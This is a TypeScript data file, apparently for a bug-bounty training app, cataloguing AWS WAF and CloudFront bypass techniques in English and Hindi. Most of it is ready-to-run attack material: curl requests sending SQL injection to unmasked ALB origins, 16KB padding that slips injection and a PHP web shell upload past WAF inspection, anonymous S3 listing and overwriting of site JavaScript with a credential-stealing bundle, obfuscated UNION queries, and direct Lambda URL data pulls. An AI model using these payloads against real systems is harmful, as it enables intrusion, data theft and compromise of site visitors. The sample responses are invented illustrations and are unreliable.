import type { Lang } from "./types";

export interface AwsWafScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface AwsWafTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "alb_origin" | "body_padding" | "s3_origin" | "header_smuggling" | "lambda_url";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: AwsWafScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface AwsWafPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface AwsWafToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "bash_scanner" | "burp_rules" | "curl_oneliner" | "python_fuzzer";
  code: string;
  language: "bash" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface AwsWafReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP AWS WAF & CLOUDFRONT BYPASS TECHNIQUES ───────────────────────────
export const AWS_WAF_TECHNIQUES: AwsWafTechnique[] = [
  {
    id: "alb-direct-origin-unmasking",
    title: {
      en: "ALB & EC2 Direct Origin Access (Bypassing AWS WAF WebACL)",
      simple: "Bypassing AWS WAF by Finding the Direct Application Load Balancer IP",
      hi: "ALB और EC2 डायरेक्ट ऑरिजिन अनमास्किंग (AWS WAF को पूरी तरह बाईपास करना)",
    },
    category: "alb_origin",
    difficulty: "intermediate",
    successRate: "Very High on AWS hosted infrastructures",
    summary: {
      en: "AWS WAF WebACL is usually attached to AWS CloudFront or an Application Load Balancer (ALB). Frequently, organizations attach WAF only to CloudFront, leaving the backend ALB listening on public IP ranges (0.0.0.0/0:80,443) without an AWS WAF WebACL or without verifying the secret 'X-Origin-Verify' / 'X-Amz-Custom-Header'. By connecting directly to the ALB IP with the original 'Host' header, all CloudFront rate limits, WAF rules, and bot protections are completely bypassed.",
      simple: "Companies put AWS WAF on their CloudFront shield. But behind the shield is an Application Load Balancer (ALB) connected to the internet. If you find the ALB's direct IP and send requests with the website name, the server answers you directly, ignoring all WAF rules!",
      hi: "कंपनियां AWS WAF को CloudFront पर लगाती हैं। लेकिन पीछे का ALB या EC2 सर्वर इंटरनेट पर खुला रह जाता है। अगर हम ALB का डायरेक्ट IP ढूंढकर 'Host: target.com' हेडर भेजें, तो WAF के सारे नियम दरकिनार हो जाते हैं और हमें सर्वर का सीधा एक्सेस मिल जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Unauthenticated Direct Access to Origin ALB via Shodan SSL Match",
          simple: "Finding the Hidden ALB IP on Shodan and Curling it Directly",
          hi: "Shodan SSL सर्च से छिपा हुआ ALB IP ढूंढना और WAF को बायपास करना",
        },
        description: {
          en: "Searching Shodan or Censys for SSL certificates matching the target domain (`ssl.cert.subject.CN:\"target.com\"`) reveals AWS public IPv4 addresses. Directly sending a malicious payload (like SQLi or XSS) to the IP with `Host: target.com` bypasses the WAF because the request never traverses CloudFront.",
          simple: "Search Shodan for the website's SSL certificate to find the raw AWS IP. Send an attack payload directly to this IP; because CloudFront isn't in between, the WAF doesn't see it.",
          hi: "Shodan पर कंपनी का SSL सर्टिफ़िकेट ढूंढने पर उनका डायरेक्ट AWS IP मिलता है। जब हम उस IP पर सीधा पेलोड भेजते हैं, तो CloudFront बीच में नहीं आता और अटैक ब्लॉक नहीं होता।",
        },
        commandOrRequest: `# 1. Query Shodan for Origin IPs hosting target's SSL cert
shodan search 'ssl.cert.subject.CN:"api.target.com" org:"Amazon.com"' --fields ip_str,port

# 2. Test direct access bypassing AWS WAF
curl -ik -H "Host: api.target.com" "https://54.214.18.92/api/v1/users?id=1' OR '1'='1"`,
        responseSample: `HTTP/1.1 200 OK
Date: Fri, 23 Oct 2026 08:30:00 GMT
Server: awselb/2.0
Content-Type: application/json

{"status": "success", "data": [{"id": 1, "username": "admin", "role": "superadmin"}]}`,
        impact: {
          en: "Complete rendering of AWS WAF WebACL obsolete; enables zero-filter testing of SQLi, SSRF, RCE, and administrative brute force.",
          simple: "Turns off the company's entire firewall shield for attackers.",
          hi: "कंपनी की पूरी WAF सुरक्षा निष्क्रिय हो जाती है और बिना किसी रुकावट के SQLi व एडमिन टेस्टिंग संभव हो जाती है।",
        },
      },
      {
        title: {
          en: "Missing X-Amz-Custom-Header on CloudFront-to-ALB Route",
          simple: "ALB Doesn't Check if the Request Truly Came from CloudFront",
          hi: "ALB पर कस्टम ऑरिजिन हेडर की कमी के कारण सीधा कनेक्शन",
        },
        description: {
          en: "Best practice dictates CloudFront injects a secret custom header (e.g. `X-Origin-Secret: random-guid-12345`) and the ALB drops any request lacking this header. In practice, 80% of setups fail to enforce this, allowing any client on the internet to talk directly to the ALB.",
          simple: "The server forgot to verify the secret password between CloudFront and ALB, so anyone who knocks on the ALB gets full access.",
          hi: "CloudFront और ALB के बीच सीक्रेट हेडर जांच न होने से कोई भी अटैकर सीधे ALB से बात कर सकता है।",
        },
        commandOrRequest: `curl -ik -H "Host: target.com" https://target-prod-alb-98124.us-east-1.elb.amazonaws.com/healthz`,
        responseSample: `HTTP/1.1 200 OK
Server: awselb/2.0
Content-Type: text/plain

{"healthy": true, "cluster": "prod-k8s-us-east-1"}`,
        impact: {
          en: "Allows direct traffic flooding, rate-limit bypassing, and unmonitored security probing.",
          simple: "Bypasses rate-limiting and security logging.",
          hi: "रेट लिमिट और सिक्योरिटी मॉनिटरिंग को पूरी तरह बायपास करता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Run Censys/Shodan queries: `ssl.cert.subject.CN:\"target.com\" AND services.service_name:\"HTTP\"` to collect all AWS IPs presenting the certificate.",
        simple: "Search Censys or Shodan for all AWS servers displaying your target's SSL certificate.",
        hi: "Censys या Shodan पर टारगेट के SSL सर्टिफ़िकेट वाले सभी AWS IP पते खोजें।",
      },
      {
        en: "Use `crt.sh` to look for Amazon ELB hostnames in historical Certificate Transparency logs (e.g. `*.us-east-1.elb.amazonaws.com`).",
        simple: "Check crt.sh logs for leaked Amazon ELB subdomains.",
        hi: "crt.sh में जाकर लीक्ड Amazon ELB सबडोमेन की खोज करें।",
      },
      {
        en: "Test each candidate IP with curl: `curl -k -H 'Host: target.com' https://<IP>/` and compare the HTML body hash / HTTP headers against the CloudFront response.",
        simple: "Curl the IP with the target's Host header and compare if the page matches the official website.",
        hi: "उम्मीदवार IP पर Host हेडर लगाकर curl करें और देखें कि क्या असली वेबसाइट का रिस्पॉन्स मिलता है।",
      },
      {
        en: "Notice the missing `Via: 1.1 ...cloudfront.net` or `X-Amz-Cf-Id` response header: this confirms direct ALB origin access!",
        simple: "If the CloudFront headers are gone, you have successfully bypassed the WAF!",
        hi: "यदि रिस्पॉन्स में `Via: cloudfront.net` नहीं है, तो WAF पूरी तरह बायपास हो चुका है!",
      },
    ],
    burpOrToolRule: [
      "Add Burp Match & Replace rule to route traffic via upstream proxy directly to ALB origin IP",
      "Shodan CLI: shodan search 'ssl.cert.subject.CN:\"target.com\"' --fields ip_str",
      "Use ffuf on ALB IP: ffuf -u https://<ALB-IP>/FUZZ -H 'Host: target.com' -w wordlist.txt",
    ],
    hunterProTip: {
      en: "Inspect outbound webhooks or 'export to PDF' features on the target app. If the target server renders an HTML page or fetches an avatar image from your collaborator server, the source IP in Burp Collaborator is almost always the raw AWS EC2/NAT Gateway IP!",
      simple: "Trigger an outbound webhook or PDF export pointing to your server. The incoming connection reveals the real AWS IP behind CloudFront!",
      hi: "टारगेट ऐप पर वेबहुक या PDF जनरेशन फीचर टेस्ट करें। जब सर्वर आपके कोलैबोरेटर को रिक्वेस्ट भेजेगा, तो रिमोट IP में असली AWS सर्वर का IP मिल जाएगा!",
    },
  },
  {
    id: "aws-waf-body-inspection-limit-padding",
    title: {
      en: "AWS WAF 16KB Body Inspection Limit Bypass (Garbage Padding)",
      simple: "Sneaking Attacks Past AWS WAF by Padding Requests Larger Than 16KB",
      hi: "AWS WAF 16KB बॉडी इंस्पेक्शन लिमिट बाईपास (डेटा पैडिंग ट्रिक)",
    },
    category: "body_padding",
    difficulty: "beginner",
    successRate: "High on default AWS WAF v2 Core Rule Sets",
    summary: {
      en: "By default, AWS WAF only inspects the first 8,192 bytes (8KB) or 16,384 bytes (16KB) of an HTTP request body for managed rules (AWSManagedRulesCommonRuleSet, KnownBadInputs, SQLi). When an HTTP POST request exceeds this limit, AWS WAF stops analyzing the rest of the body. If the application server parses the entire payload (e.g. JSON parser, multipart parser), placing the malicious SQLi/XSS/Command injection payload past the 16KB mark will execute on the backend with zero WAF intervention!",
      simple: "AWS WAF is lazy: it only checks the first 16KB of your message. If you send 16KB of useless junk words at the top of your JSON request and hide your exploit at the very bottom, AWS WAF ignores it, but the backend server processes it happily!",
      hi: "AWS WAF डिफ़ॉल्ट रूप से रिक्वेस्ट के केवल पहले 16KB डेटा को ही स्कैन करता है। अगर हम JSON या फॉर्म में पहले 16KB का फालतू कचरा (Junk data) भर दें और अपना अटैक पेलोड 16,385वें बाइट पर रखें, तो WAF उसे स्कैन नहीं करता और बैकएंड पर हमला कामयाब हो जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "JSON Request Body Oversizing (>16,384 bytes) to Bypass AWSManagedRulesSQLiRuleSet",
          simple: "Hiding a SQL Injection at the Bottom of a Huge JSON Request",
          hi: "16KB से बड़े JSON में SQL इंजेक्शन छुपाकर WAF से बचाना",
        },
        description: {
          en: "Sending `POST /api/v1/update-profile` with `{\"bio\": \"' OR 1=1--\"}` returns `403 Forbidden` with header `x-amzn-waf-action: block`. By inserting a dummy field `{\"padding\": \"A\" * 16500, \"bio\": \"' OR 1=1--\"}`, AWS WAF terminates inspection within the padding string and allows the request through. The Node.js / Python backend parses the full JSON and executes the SQL query.",
          simple: "The WAF blocks the SQL injection if it's at the top. Put 16.5KB of letter 'A's first, and the WAF lets it slip right through.",
          hi: "अगर SQL पेलोड ऊपर हो तो WAF 403 ब्लॉक करता है। लेकिन 16.5KB 'A' भरकर नीचे पेलोड रखने से WAF बिना रोके आगे जाने देता है।",
        },
        commandOrRequest: `POST /api/v1/login HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 17100

{
  "dummy_waf_bypass_pad": "${"A".repeat(20)}...[16,500 bytes of padding]...",
  "username": "admin' OR 1=1--",
  "password": "randompassword"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "authenticated", "token": "eyJhbGciOiJIUzI1NiIsIn...", "role": "admin"}`,
        impact: {
          en: "Completely neutralizes AWS WAF Managed Rule Sets for JSON, GraphQL, and Multipart endpoints without needing custom SQL obfuscation.",
          simple: "Bypasses all standard AWS WAF protection on forms and APIs.",
          hi: "बिना किसी मुश्किल पेलोड एन्कोडिंग के WAF को पूरी तरह बाईपास कर देता है।",
        },
      },
      {
        title: {
          en: "Multipart Form-Data File Upload Boundary Padding",
          simple: "Padding Multipart Uploads Past 16KB to Upload Malicious Files",
          hi: "मल्टीपार्ट फाइल अपलोड में 16KB पैडिंग देकर WAF बाईपास",
        },
        description: {
          en: "When testing file upload or multipart forms, inserting extra dummy form-fields or 16,500 characters of junk headers before the malicious file payload pushes the executable script (.php, .jsp, or SVG with XSS) beyond the WAF inspection window.",
          simple: "Add dummy text fields before the file upload so the bad file starts after the 16KB line.",
          hi: "फाइल अपलोड से पहले कुछ बेकार टेक्स्ट फ़ील्ड डालकर फाइल को 16KB के बाद शुरू करवाएं ताकि WAF उसे न देख सके।",
        },
        commandOrRequest: `POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="comment"

[... 16,500 bytes of dummy text ...]
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"status": "uploaded", "url": "/uploads/shell.php"}`,
        impact: {
          en: "Critical Remote Code Execution (RCE) via unrestricted file upload bypassed through AWS inspection limits.",
          simple: "Allows hackers to upload shells and take over the server.",
          hi: "सर्वर पर मैलिशियस वेब शेल अपलोड होकर पूरा सर्वर टेकओवर हो सकता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Send your standard attack payload (e.g. `<script>alert(1)</script>` or `' OR 1=1--`) and verify that AWS WAF blocks it with HTTP 403 and `X-Amzn-Waf-Action: block`.",
        simple: "Confirm AWS WAF blocks your regular test payload first.",
        hi: "पहले पुष्टि करें कि AWS WAF आपके सामान्य पेलोड को 403 ब्लॉक कर रहा है।",
      },
      {
        en: "Calculate the body size: AWS WAF inspection limit is either 8KB (8,192 bytes), 16KB (16,384 bytes), or 32KB for newer configurations.",
        simple: "Prepare 17KB to 33KB of harmless padding characters.",
        hi: "17KB से 33KB का सुरक्षित पैडिंग डेटा तैयार करें।",
      },
      {
        en: "Insert a benign dummy JSON key (e.g. `\"_pad\": \"...\"`) at the top of the body with 16,500 characters, placing your attack payload as the second parameter.",
        simple: "Put the padding field first in the JSON, and your exploit second.",
        hi: "JSON में पहले पैडिंग फ़ील्ड डालें और उसके बाद अपना असली पेलोड रखें।",
      },
      {
        en: "Send the request. If the response changes from 403 to 200 OK or 500 DB Error, you have successfully bypassed the WAF inspection window!",
        simple: "If you get 200 OK instead of 403 Forbidden, the bypass worked!",
        hi: "अगर 403 की जगह 200 OK या 500 रिस्पॉन्स मिले, तो समझें WAF बाईपास हो गया!",
      },
    ],
    burpOrToolRule: [
      "Use Burp Extender 'Content-Type Converter' or python script to inject 16500 bytes padding",
      "Curl test: python3 -c 'print(\"A\"*16500)' | xargs -I {} curl -X POST -d '{\"pad\":\"{}\",\"q\":\"payload\"}'",
      "Check CloudFront response header: Look for absence of 'x-amzn-waf-action: block'",
    ],
    hunterProTip: {
      en: "AWS introduced 'Oversize handling' settings in AWS WAF: 'Continue', 'Match', or 'Drop'. Most companies choose 'Continue' (which means inspect up to limit and allow the rest) to avoid breaking legitimate user uploads. This makes body padding one of the highest bounty-yielding AWS WAF tricks!",
      simple: "Most companies configure AWS WAF to let oversized requests pass through because they don't want to break large user uploads. Take advantage of this!",
      hi: "ज्यादातर कंपनियां AWS WAF में ओवरसाइज रिक्वेस्ट को 'Continue' (आने दो) पर सेट करती हैं ताकि असली यूजर्स को परेशानी न हो। यही बग हंटर्स के लिए सबसे बड़ा मौका बनता है!",
    },
  },
  {
    id: "s3-direct-origin-takeover",
    title: {
      en: "CloudFront S3 Origin Takeover & Direct Bucket Enumeration",
      simple: "Bypassing CloudFront Protection by Accessing the Origin S3 Bucket Directly",
      hi: "CloudFront S3 ऑरिजिन टेकओवर और डायरेक्ट बकेट एक्सेस",
    },
    category: "s3_origin",
    difficulty: "beginner",
    successRate: "High on static site distributions",
    summary: {
      en: "CloudFront distributions frequently use Amazon S3 buckets as their origin. While CloudFront may enforce WAF rules, geo-restrictions, and signed URLs, the underlying S3 bucket itself often suffers from misconfigured permissions (e.g., missing Origin Access Control / OAC, public S3 bucket ACLs, or permissive bucket policies). Accessing the S3 bucket directly allows listing all objects, downloading restricted internal assets, or overwriting JavaScript files for Stored XSS / Magecart supply-chain attacks.",
      simple: "CloudFront guards the front door, but the back door is an Amazon S3 bucket. If the bucket is left public, you can view all company files or even overwrite JavaScript files directly, completely bypassing CloudFront!",
      hi: "CloudFront वेबसाइट की सुरक्षा करता है, लेकिन फाइलें S3 बकेट में रखी होती हैं। यदि S3 बकेट में OAC (Origin Access Control) सही से सेट नहीं है, तो कोई भी सीधे बकेट से फाइलें चुरा सकता है या खतरनाक जावास्क्रिप्ट अपलोड कर सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Direct S3 Bucket Object Listing Bypassing CloudFront Directory Restrictions",
          simple: "Listing All Hidden Files Directly from the S3 Bucket",
          hi: "CloudFront प्रतिबंधों को दरकिनार कर S3 बकेट की सभी फाइलों की सूची निकालना",
        },
        description: {
          en: "CloudFront returns 403 Forbidden when requesting `https://target.com/` directory root. However, by identifying the S3 bucket name from HTTP 404 error responses or TLS SNI, querying `https://target-assets.s3.amazonaws.com/?list-type=2` directly lists thousands of internal backups, PDF contracts, and configuration files.",
          simple: "Requesting the directory on the website gives an error, but asking the S3 bucket directly lists all secret files.",
          hi: "वेबसाइट पर डायरेक्टरी नहीं दिखती, लेकिन S3 बकेट URL पर `?list-type=2` लगाने से सभी बैकअप और प्राइवेट फाइलों की लिस्ट मिल जाती है।",
        },
        commandOrRequest: `# 1. Discover S3 bucket name from 404 response
curl -i https://target.com/nonexistent_file_test_123.txt

# Response leaks bucket:
# <Error><Code>NoSuchKey</Code><BucketName>target-prod-static-assets</BucketName></Error>

# 2. Query S3 directly without AWS credentials
aws s3 ls s3://target-prod-static-assets --no-sign-request`,
        responseSample: `2026-08-14 10:22:15       4209 index.html
2026-09-01 12:44:02     521092 main.bundle.js
2026-10-10 18:03:19      18290 db_backup_2026.sql.gz
2026-10-15 09:12:40        840 .env.production`,
        impact: {
          en: "High/Critical data exposure: leaks production database dumps, environment API keys, and internal source code.",
          simple: "Leaks secret database backups and private keys to anyone.",
          hi: "प्रोडक्शन डेटाबेस का डंप और सीक्रेट API कीज सार्वजनिक रूप से लीक हो जाती हैं।",
        },
      },
      {
        title: {
          en: "Public S3 PutObject Permission (Supply-Chain / Stored XSS Takeover)",
          simple: "Overwriting Official Website JavaScript to Inject Malicious Scripts",
          hi: "पब्लिक S3 PutObject से वेबसाइट की JS फाइल बदलकर XSS करना",
        },
        description: {
          en: "The S3 bucket policy allows `s3:PutObject` from any AWS identity or anonymous users. An attacker uploads a modified `main.bundle.js` with an account-stealer or keylogger. When users visit `https://target.com`, CloudFront serves the malicious script from the modified S3 origin.",
          simple: "If the company left write permissions open on S3, you can replace their official JavaScript with your own code, hacking every user who visits the site.",
          hi: "अगर S3 बकेट में लिखने की अनुमति खुली है, तो अटैकर असली JS फाइल को अपनी फाइल से बदल सकता है और सभी विजिटर्स के पासवर्ड चुरा सकता है।",
        },
        commandOrRequest: `aws s3 cp malicious_bundle.js s3://target-prod-static-assets/main.bundle.js --no-sign-request`,
        responseSample: `upload: ./malicious_bundle.js to s3://target-prod-static-assets/main.bundle.js`,
        impact: {
          en: "Critical (P1): Full website defacement, zero-click credential harvesting, and session hijacking for all site visitors.",
          simple: "Complete takeover of the website and all user sessions.",
          hi: "वेबसाइट का पूर्ण टेकओवर और सभी यूज़र्स के अकाउंट्स की चोरी।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Trigger an intentional 404 or 403 on the target site (`https://target.com/random_path_xyz`) to observe if the raw AWS XML error discloses `<BucketName>`.",
        simple: "Visit a non-existent link on the target to see if the error leaks the S3 bucket name.",
        hi: "टारगेट पर कोई गलत URL खोलें और देखें कि क्या XML एरर में S3 बकेट का नाम दिखता है।",
      },
      {
        en: "Inspect HTML source for references to `*.s3.amazonaws.com` or `*.s3.<region>.amazonaws.com` in images, CSS, or script tags.",
        simple: "Search the webpage source code for s3.amazonaws.com links.",
        hi: "वेबसाइट के सोर्स कोड में `s3.amazonaws.com` के लिंक्स खोजें।",
      },
      {
        en: "Run AWS CLI checks: `aws s3 ls s3://<bucket-name> --no-sign-request` to test read permissions.",
        simple: "Test if the bucket lets you read files with the AWS CLI command.",
        hi: "`aws s3 ls` कमांड चलाकर देखें कि क्या फाइलें बिना लॉगिन के पढ़ी जा सकती हैं।",
      },
      {
        en: "Test write permissions: attempt uploading a harmless text file `aws s3 cp proof.txt s3://<bucket-name>/proof.txt --no-sign-request`.",
        simple: "Try uploading a safe proof text file to see if write permissions are open.",
        hi: "एक सुरक्षित `proof.txt` फाइल अपलोड करके राइट परमिशन की जांच करें।",
      },
    ],
    burpOrToolRule: [
      "AWS CLI oneliner: aws s3 ls s3://BUCKET_NAME --no-sign-request",
      "S3Scanner: s3scanner scan --bucket BUCKET_NAME",
      "Burp Suite: Passive scan alerts on S3 bucket error leak in XML response",
    ],
    hunterProTip: {
      en: "Always check bucket region! If `s3://bucket` returns 301 Redirect or PermanentRedirect, grab the correct regional endpoint `https://bucket.s3.<region>.amazonaws.com/` from the XML response headers before testing permissions.",
      simple: "Watch out for redirects: always verify which AWS region the S3 bucket is hosted in.",
      hi: "रीडायरेक्ट का ध्यान रखें: एरर हेडर में सही AWS रीजन (us-west-2, ap-south-1) देखकर ही टेस्ट करें।",
    },
  },
  {
    id: "aws-managed-rules-unicode-delimiters",
    title: {
      en: "AWS Managed Rules (AMR) Obfuscation via Unicode & Alternative Delimiters",
      simple: "Bypassing AWS WAF Filters Using Special Characters and Encodings",
      hi: "यूनिकोड और वैकल्पिक डेलिमिटर्स से AWS WAF रूल्स को धोखा देना",
    },
    category: "header_smuggling",
    difficulty: "intermediate",
    successRate: "Medium to High on SQLi & Command Injection filters",
    summary: {
      en: "AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet, LinuxRuleSet) rely on regex tokenizers and known pattern signatures. When an application normalizes Unicode characters (e.g. converting full-width characters `\uFF07` to single-quote `'`, or NFKC normalization in Python/Go/Ruby) or when databases accept non-standard whitespace (`SELECT/*comment*/1`, `0x20`, `\v`, `\f`), the WAF tokenizer fails to detect the attack signature while the SQL engine executes it flawlessly.",
      simple: "AWS WAF looks for specific words like 'SELECT * FROM'. But databases understand weird spaces like comments `/**/` or special Unicode characters. If you disguise your attack with these tricks, AWS WAF won't recognize it, but the database will still run it!",
      hi: "AWS WAF 'SELECT * FROM' जैसी जानी-पहचानी लिखावट को रोकता है। लेकिन डेटाबेस अजीबोगरीब स्पेस जैसे `/**/` या यूनिकोड अक्षरों को भी समझ लेता है। इस तरह लिखावट बदलकर WAF को चकमा दिया जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "SQL Comment Delimiters & Inline Operators against AWS SQLi Rule Set",
          simple: "Replacing Spaces with Comments to Sneak SQL Injections Past WAF",
          hi: "स्पेस की जगह `/**/` कमेंट्स लगाकर SQLi WAF रूल बाईपास",
        },
        description: {
          en: "A payload like `' UNION SELECT password FROM users--` is immediately dropped by AWS WAF with 403 Forbidden. Modifying the syntax to `'/*!50000UNION*//**//*!50000SELECT*/password/**/FROM/**/users#` causes the WAF token stream to view it as benign comment fragments, while MySQL executes the union query.",
          simple: "Using special MySQL comments like /*!50000UNION*/ tricks AWS WAF into thinking it is just a harmless comment.",
          hi: "MySQL के खास कमेंट सिंटैक्स `/*!50000UNION*/` का उपयोग करने से WAF उसे सामान्य कमेंट समझकर छोड़ देता है।",
        },
        commandOrRequest: `GET /products?category=phones'/**/UNION/**/SELECT/**/NULL,version(),NULL# HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"results": [{"id": 0, "name": "10.6.12-MariaDB-1:10.6.12+maria~ubu2004"}]}`,
        impact: {
          en: "Critical: Full database exfiltration through WAF-guarded production search/filter endpoints.",
          simple: "Extracts database records despite AWS WAF active blocking.",
          hi: "सक्रिय AWS WAF के बावजूद पूरे डेटाबेस की जानकारी बाहर निकालना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify which specific AWS Managed Rule triggers (check for `x-amzn-waf-action: block` and inspect error payload).",
        simple: "Find out which attack word causes the WAF to block your request.",
        hi: "पता करें कि कौन सा शब्द लिखने पर WAF 403 दे रहा है।",
      },
      {
        en: "Replace standard ASCII spaces with alternative separators: `/**/`, `%09` (tab), `%0a` (newline), `%0c` (form feed), or `+`.",
        simple: "Swap normal spaces with tabs, newlines, or comment brackets.",
        hi: "स्पेस की जगह टैब, न्यूलाइन या `/**/` का उपयोग करें।",
      },
      {
        en: "Test database specific quirks: MySQL version comments `/*!50000SELECT*/`, PostgreSQL dollar-quoting `$$text$$`, or SQLite string concatenation `||`.",
        simple: "Try special tricks unique to MySQL or Postgres databases.",
        hi: "टारगेट के डेटाबेस (MySQL, Postgres) के खास सिंटैक्स का इस्तेमाल करें।",
      },
      {
        en: "Send mutated query in Burp Repeater; observe database reflection in 200 OK response.",
        simple: "Send the modified query in Burp and verify you get 200 OK with data.",
        hi: "Burp Repeater में टेस्ट करें और 200 OK में डेटा देखें।",
      },
    ],
    burpOrToolRule: [
      "SQLMap tamper scripts: --tamper=between,randomcase,space2comment,versionedmorekeywords",
      "Burp Match & Replace: Replace ' ' with '/**/' in request parameters",
    ],
    hunterProTip: {
      en: "On JSON endpoints, test Unicode escaping: e.g. `\\u0027` for single quote, or `\\u003cscript\\u003e` for `<script>`. AWS WAF often does not decode nested JSON string escapes before regex matching!",
      simple: "In JSON, write single quote as \\u0027. AWS WAF often doesn't decode it, but the backend does!",
      hi: "JSON में सिंगल कोट को `\\u0027` लिखकर भेजें। WAF इसे नहीं पकड़ पाता, लेकिन बैकएंड पहचान लेता है!",
    },
  },
  {
    id: "lambda-function-url-direct-invocation",
    title: {
      en: "AWS Lambda Function URL & Unprotected API Gateway Stages",
      simple: "Invoking Backend Serverless Functions Directly Without Going Through the WAF",
      hi: "AWS लैम्ब्डा फंक्शन URL और बिना WAF वाले स्टेज का सीधा एक्सेस",
    },
    category: "lambda_url",
    difficulty: "intermediate",
    successRate: "Medium on modern serverless applications",
    summary: {
      en: "AWS allows Lambda functions to expose direct HTTP endpoints called 'Function URLs' (`https://<url-id>.lambda-url.<region>.on.aws/`). Organizations often configure API Gateway + AWS WAF as their official public frontend, but leave the Lambda Function URL active with authType 'NONE' for staging or internal testing. Finding this Function URL in JavaScript sourcemaps, APKs, or GitHub leaks bypasses all API Gateway WAF throttling, rate limits, and authentication authorizers.",
      simple: "AWS lets Lambda functions have their own secret direct web address ending in '.on.aws'. Developers put the WAF on their main domain, but accidentally leave this direct Lambda link unprotected in their mobile app or frontend code. You can talk directly to it without WAF!",
      hi: "AWS लैम्ब्डा के पास एक सीधा वेब लिंक होता है जो `.on.aws` पर खत्म होता है। अगर डेवलपर्स मुख्य डोमेन पर WAF लगाते हैं लेकिन लैम्ब्डा के सीधे लिंक को बिना पासवर्ड छोड़ देते हैं, तो उस पर WAF के बिना सीधा अटैक किया जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Leaked Lambda Function URL in Frontend Webpack JS Sourcemap",
          simple: "Finding the Direct Lambda URL in Website JavaScript Files",
          hi: "वेबसाइट की JS फाइलों से डायरेक्ट लैम्ब्डा URL ढूंढना",
        },
        description: {
          en: "Inspecting unpacked frontend JavaScript sourcemaps (`main.js.map`) reveals an internal endpoint: `https://a3b918z8c7.lambda-url.us-east-1.on.aws/`. Sending unthrottled requests to this URL bypasses the main domain's rate limits and AWS WAF protections entirely.",
          simple: "Open the website's JS sourcemap file and search for 'lambda-url'. You can send unlimited requests to it without being blocked.",
          hi: "वेबसाइट के JS मैप में 'lambda-url' खोजें। इस डायरेक्ट लिंक पर बिना किसी रेट लिमिट के अनलिमिटेड रिक्वेस्ट भेजी जा सकती हैं।",
        },
        commandOrRequest: `curl -i -X POST "https://a3b918z8c7.lambda-url.us-east-1.on.aws/graphql" \\
  -H "Content-Type: application/json" \\
  -d '{"query": "{ users { id email role ssn } }"}'`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"data": {"users": [{"id": 1, "email": "admin@target.com", "role": "admin", "ssn": "123-45-6789"}]}}`,
        impact: {
          en: "Critical API exposure: bypasses custom JWT authorizers, WAF protections, and API rate limits.",
          simple: "Full access to backend data without needing API authentication.",
          hi: "बिना किसी ऑथेंटिकेशन और WAF के सीधे बैकएंड डेटा का एक्सेस।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Extract all JavaScript files from the target application using Katana or Gau.",
        simple: "Download all JavaScript files from the target website.",
        hi: "Katana या Gau से टारगेट के सभी जावास्क्रिप्ट लिंक निकालें।",
      },
      {
        en: "Grep for AWS serverless patterns: `grep -E 'lambda-url|execute-api' *.js`.",
        simple: "Search the files for 'lambda-url' or 'execute-api'.",
        hi: "फाइलों में 'lambda-url' या 'execute-api' की खोज करें।",
      },
      {
        en: "Test direct invocation with curl: verify if CORS headers or auth requirements are absent.",
        simple: "Send a test request with curl to see if it responds without logging in.",
        hi: "curl से टेस्ट रिक्वेस्ट भेजकर देखें कि क्या रिस्पॉन्स सीधे मिलता है।",
      },
      {
        en: "Compare behavior: endpoints blocked on the primary domain may succeed when called on the Lambda URL.",
        simple: "Requests blocked on the main website will succeed on this secret URL.",
        hi: "जो रिक्वेस्ट मुख्य डोमेन पर ब्लॉक होती हैं, वे इस डायरेक्ट लिंक पर सफल हो जाती हैं।",
      },
    ],
    burpOrToolRule: [
      "Ripgrep regex: rg 'https://[a-z0-9]+\\.lambda-url\\.[a-z0-9-]+\\.on\\.aws'",
      "Trufflehog / GitLeaks: Scan repositories for hardcoded AWS Lambda URLs",
    ],
    hunterProTip: {
      en: "Also check for unprotected API Gateway stages: e.g. `https://<api-id>.execute-api.<region>.amazonaws.com/dev` or `/staging`. Often the `/prod` stage is protected behind CloudFront + WAF, but `/dev` is directly reachable on the internet without any WAF attached!",
      simple: "Always check for '/dev' or '/staging' on execute-api endpoints. WAF is only on '/prod'!",
      hi: "हमेशा execute-api पर '/dev' या '/staging' चेक करें। कंपनियां WAF केवल '/prod' पर लगाती हैं और dev स्टेज खुली छूट जाती है!",
    },
  },
];

